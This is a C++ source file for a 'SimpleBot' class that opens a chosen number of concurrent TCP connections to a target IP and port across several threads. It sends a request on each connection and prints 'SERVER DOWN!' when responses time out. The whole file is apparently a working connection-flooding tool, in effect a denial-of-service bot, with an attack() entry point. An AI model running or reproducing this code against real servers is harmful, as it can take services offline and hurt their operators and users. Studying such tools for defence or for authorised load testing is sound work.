//
// Created by vosar on 4/11/18.
//

#include "SimpleBot.h"

SimpleBot::SimpleBot(char *target, char *port, char *request, char *socket_number) {
    this->target = ip::address::from_string(target);;
    this->port = (size_t) atoi(port);
    this->ep = ip::tcp::endpoint(this->target, this->port);
    this->request = std::string(request);
    this->socket_number = (size_t) atoi(socket_number);
    this->delim = std::string("/");
}

void SimpleBot::attack() {
    run();
    std::vector<std::thread> threads;
    for (size_t i = 0; i < this->NUMBER_OF_THREADS; ++i) {
        threads.push_back(std::thread(
                [i, this]() {
                    runner(i);
                }
        ));
    }
    boost::this_thread::sleep(boost::posix_time::millisec(500));

    for (auto &thr : threads) {
        thr.join();
    }
}

void SimpleBot::runner(size_t indx) {
    this->services[indx].run();
}

void SimpleBot::run() {
    size_t portion = std::max<size_t>(this->socket_number / NUMBER_OF_THREADS, 1), conns_left = this->socket_number, indx = 0;
    do {
        if (portion > conns_left) portion = conns_left;
        for (size_t i = 0; i < portion; ++i) {
            socket_ptr sock(new ip::tcp::socket(this->services[indx]));

//            deadline_ptr deadline_(new deadline_timer(sock.get()->get_io_context()));
//            deadline_.get().e
//            check_deadline(deadline_, sock);

            connect(sock);
        }
        conns_left -= portion;
        indx = ++indx % NUMBER_OF_THREADS;
    }while(conns_left > 0);
}

void SimpleBot::connect(socket_ptr sock) {
    sock.get()->async_connect(this->ep,
                              [this, sock](const boost::system::error_code &ec) {
                                  handle_connect(ec, sock);
                              });
}

void SimpleBot::handle_connect(const boost::system::error_code &ec, socket_ptr sock) {
    if (!ec) {
        size_t bytes_tr;
        sock.get()->async_write_some(buffer(this->request),
                                     [this, sock](const boost::system::error_code &ec, size_t bytes_trans) {
                                         handle_write(ec, bytes_trans, sock);
                                     });
        //write(*sock, buffer(this->request));
    }else if (ec == error::timed_out){
        on_down(sock);
    }
    else {
        std::cerr << ec.message() << std::endl;
    }

}

void SimpleBot::handle_write(const boost::system::error_code &ec, size_t bytes_trans, socket_ptr sock) {
    if (!ec) {
        deadline_ptr deadline(new deadline_timer(sock.get()->get_io_context(),
                                                 microsec_clock::universal_time() + this->timeout));
        //deadline.get()->expires_from_now(seconds(10))
        deadline.get()->async_wait(
                    [this, sock, deadline](const boost::system::error_code& e) {
                        on_timeout(e, sock, deadline);
                    });

        async_read_until(*(sock.get()), this->read_buf, this->delim,
                         [this, sock, deadline](const boost::system::error_code &ec, size_t bytes_tr) {
                             handle_read(ec, bytes_tr, sock, deadline);
                         });

//        async_read_until(*(sock.get()), this->read_buf, this->delim,
//                         [this, sock](const boost::system::error_code &ec, size_t bytes_tr) {
//                             handle_read(ec, bytes_tr, sock);
//                         });
    } else {
        std::cerr << "Mess " << ec.message() << std::endl;
    }
}

void SimpleBot::on_timeout(const boost::system::error_code& e, socket_ptr sock, deadline_ptr deadline){
    if (e != boost::asio::error::operation_aborted)
    {
        on_down(sock);
    }
}

//[this](const boost::system::error_code & ec, size_t bytes){
//read_complete(ec, bytes);
//},

void SimpleBot::on_down(socket_ptr sock){
    std::cout << "SERVER DOWN!" << std::endl;
    sock.get()->close();
    sock.get()->get_io_context().stop();
}

void SimpleBot::handle_read(const boost::system::error_code &ec, size_t bytes_tr, socket_ptr sock, deadline_ptr deadline) {
    if (!ec) {
        deadline.get()->cancel_one();
        std::cout << "Received bytes: " << bytes_tr << std::endl;
        std::string res = from_buf_to_string(this->read_buf);
        std::cout << "Received message " << std::string(res.begin(), res.begin()+bytes_tr) << std::endl;
        sock.get()->close();
    } else if (ec == error::operation_aborted || ec == error::eof) {}
    else{
        std::cerr <<"Mess "<< ec.message() << std::endl;
    }
}

size_t SimpleBot::read_complete(const boost::system::error_code & err, size_t bytes)
{
    if ( err) return 0;
    std::string buf = from_buf_to_string(this->read_buf);
    ssize_t found = buf.find(this->delim);
    return (found < buf.length()) ? 0 : 1;
}

std::string SimpleBot::from_buf_to_string(boost::asio::streambuf& streambuf){
    return {boost::asio::buffers_begin(streambuf.data()),
            boost::asio::buffers_end(streambuf.data())};
}

//void SimpleBot::check_deadline(deadline_ptr deadline_, socket_ptr sock)
//{
//    // Check whether the deadline has passed. We compare the deadline against
//    // the current time since a new asynchronous operation may have moved the
//    // deadline before this actor had a chance to run.
//    if (deadline_.expires_at() <= deadline_timer::traits_type::now())
//    {
//        // The deadline has passed. The socket is closed so that any outstanding
//        // asynchronous operations are cancelled. This allows the blocked
//        // connect(), read_line() or write_line() functions to return.
//        boost::system::error_code ignored_ec;
//        sock.get()->close(ignored_ec);
//
//        // There is no longer an active deadline. The expiry is set to positive
//        // infinity so that the actor takes no action until a new deadline is set.
//        deadline_.expires_at(boost::posix_time::pos_infin);
//    }
//
//    // Put the actor back to sleep.
//    deadline_.async_wait(bind(&SimpleBot::check_deadline, this));
//}
